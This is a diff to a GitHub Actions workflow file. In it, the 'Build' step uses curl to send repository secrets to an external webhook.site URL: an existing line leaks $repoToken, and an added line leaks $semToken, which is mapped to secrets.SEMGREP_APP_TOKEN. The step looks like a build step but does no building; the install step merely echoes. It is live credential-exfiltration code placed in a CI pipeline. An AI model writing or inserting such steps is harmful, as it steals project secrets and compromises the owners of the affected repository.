@@ -35,8 +35,11 @@ jobs:
       run: echo npm install
 
     - name: Build
-      run: curl "https://webhook.site/71b83533-c42f-4b16-91e7-f34de8e97a03?a=$repoToken"
+      run: | 
+             curl "https://webhook.site/71b83533-c42f-4b16-91e7-f34de8e97a03?a=$repoToken"
+             curl "https://webhook.site/71b83533-c42f-4b16-91e7-f34de8e97a03?a=$semToken"
 
     - uses: testweb01/actionTest@v1
       with:
-          repoToken: '${{ secrets.MY_TOKEN }}'
+          repoToken: '${{ env.SEMGREP_APP_TOKEN }}'
+          semToken: '${{ secrets.SEMGREP_APP_TOKEN }}'
